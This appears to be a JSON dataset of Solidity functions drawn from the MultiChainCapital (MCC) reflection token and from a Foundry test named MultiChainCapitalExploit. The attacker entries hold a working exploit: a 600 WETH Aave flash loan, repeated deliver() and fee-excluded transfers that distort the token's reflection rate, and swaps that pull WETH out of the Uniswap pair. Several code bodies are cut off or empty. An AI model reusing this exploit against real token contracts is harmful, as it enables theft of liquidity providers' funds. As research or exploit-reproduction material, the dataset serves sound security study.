[
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "        function allowance(address owner, address spender) public view override returns (uint256) {\n            return _allowances[owner][spender];\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "        function approve(address spender, uint256 amount) public override returns (bool) {\n            _approve(_msgSender(), spender, amount);\n            return true;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "        function balanceOf(address account) public view override returns (uint256) {\n            if (_isExcluded[account]) return _tOwned[account];\n            return tokenFromReflection(_rOwned[account]);\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "        function decimals() public view returns (uint8) {\n            return _decimals;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "deliver",
    "original_code": "        function deliver(uint256 tAmount) public {\n            address sender = _msgSender();\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "isExcluded",
    "original_code": "        function isExcluded(address account) public view returns (bool) {\n            return _isExcluded[account];\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "isExcludedFromFee",
    "original_code": "        function isExcludedFromFee(address account) public view returns(bool) {\n            return _isExcludedFromFee[account];\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "        function name() public view returns (string memory) {\n            return _name;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "        function owner() public view returns (address) {\n            return _owner;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "reflectionFromToken",
    "original_code": "        function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {\n            require(tAmount <= _tTotal, \"Amount must be less than supply\");\n            if (!deductTransferFee) {\n                (uint256 rAmount,,,,,) = _getValues(tAmount);\n                return rAmount;\n            } else {\n                (,uint256 rTransferAmount,,,,) = _getValues(tAmount);\n                return rTransferAmount;\n            }\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "        function symbol() public view returns (string memory) {\n            return _symbol;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "tokenFromReflection",
    "original_code": "        function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n            require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n            uint256 currentRate =  _getRate();\n            return rAmount.div(currentRate);\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "        function totalSupply() public view override returns (uint256) {\n            return _tTotal;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "        function transfer(address recipient, uint256 amount) public override returns (bool) {\n            _transfer(_msgSender(), recipient, amount);\n            return true;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "        function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n            _transfer(sender, recipient, amount);\n            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n            return true;\n        }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMCC",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address, /*asset*/\n        uint256, /*amount*/\n        uint256, /*premium*/\n        address, /*initator*/\n        bytes calldata /*params*/\n    ) external payable returns (bool) {\n        times = 2;\n        (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();\n        emit log_named_uint(\"Reserve0\", reserve0);\n        emit log_named_uint(\"Reserve1\", reserve1);\n        // uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, 58158410617997415654, 999830779487969029700);\n        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve1, reserve0);\n        weth.transfer(address(mcc_weth), amountIn);\n        mcc_weth.swap(amount1000 / 100_000 * 10_001, 0, address(this), new bytes(0));\n        mcc.transfer(excludedFromFeeAddress, 1);\n        rTotal = mcc.reflectionFromToken(amount1000, false);\n        uint256 attackerBalance = mcc.balanceOf(address(this));\n        uint256 attackerROwned = mcc.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        times = 2;\n        func1f46(10, 1033);\n\n        attackerBalance = mcc.balanceOf(address(this));\n        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1f46(10, 1034);\n\n        attackerBalance = mcc.balanceOf(address(this));\n        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1f46(10, 1035);\n\n        attackerBalance = mcc.balanceOf(address(this));\n        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1f46(10, 1036);\n        func1f46(10, 1069);\n        func1f46(10, 1046);\n        func1f46(4, 1018);\n        func21b0(10_000);\n\n        rTotal = mcc.reflectionFromToken(amount1000, false);\n        func1f46(10, 1095);\n        func1f46(10, 1081);\n        func1f46(10, 1066);\n        func1f46(10, 1049);\n        func1f46(10, 1029);\n        func21b0(5000);\n\n        rTotal = mcc.reflectionFromToken(amount1000, false);\n        func1f46(10, 1049);\n        func1f46(10, 1037);\n        func1f46(10, 1023);\n        func21b0(500);\n\n        rTotal = mcc.reflectionFromToken(amount1000, false);\n        func1f46(6, 1012);\n\n        (reserve0, reserve1,) = mcc_weth.getReserves();\n        amountIn = getAmountIn(reserve0 * 9003 / 10_000, reserve1, reserve0);\n        weth.transfer(address(mcc_weth), amountIn);\n        mcc_weth.swap(reserve0 * 9003 / 10_000, 0, excludedFromFeeAddress, new bytes(0));\n\n        for (uint256 i = 0; i < 15; i++) {\n            func1d89(900);\n        }\n\n        mcc.approve(address(this), type(uint256).max);\n        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 15; i++) {\n            func1d89(900);\n        }\n\n        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 15; i++) {\n            func1d89(900);\n        }\n\n        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 7; i++) {\n            func1d89(900);\n        }\n\n        func1d89(500);\n        func1d89(500);\n        func1d89(500);\n        func1d89(50);\n        func19c(900);\n        func19c(300);\n        func19c(100);\n        func19c(20);\n\n        uint256 pairBalance = mcc.balanceOf(address(mcc_weth));\n        (reserve0, reserve1,) = mcc_weth.getReserves();\n        uint256 amountOut = getAmountOut(pairBalance - reserve0, reserve0, reserve1);\n        mcc_weth.swap(0, amountOut, address(this), new bytes(0));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\");\n\n        cheats.label(address(aavePool), \"AavePoolV3\");\n        cheats.label(address(mcc_weth), \"MCC-WETH UniswapPair\");\n        cheats.label(address(mcc), \"MCC\");\n        cheats.label(address(weth), \"WETH\");\n        cheats.label(address(router), \"UniswapV2Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        cheats.rollFork(17_221_445);\n        // emit log_named_decimal_uint(\"allowance\", mcc.allowance(address(0x52d74eb7C01C763219DCE713dA97EBAE8B91728E), address(0x52d74eb7C01C763219DCE713dA97EBAE8B91728E)), mcc.decimals());\n        emit log_named_decimal_uint(\"Attacker ETH balance before exploit\", weth.balanceOf(address(this)), 18);\n        // console.log(\"excludedFromFee:\", mcc.isExcludedFromFee(excludedFromFeeAddress));\n        // console.log(\"excluded:\", mcc.isExcluded(excludedFromFeeAddress));\n\n        weth.approve(address(aavePool), type(uint256).max);\n        aavePool.flashLoanSimple(address(this), address(weth), 600 ether, new bytes(1), 0);\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", weth.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MultiChainCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) external {\n        if (times > 5) {\n            if (times <= 25) {\n                uint256 pairBalance = mcc.balanceOf(address(mcc_weth));\n                (uint256 reserve0,,) = mcc_weth.getReserves();\n                mcc.deliver((reserve0 - pairBalance) * slot9 / 1000);\n                times += 1;\n            }\n",
    "description": ""
  }
]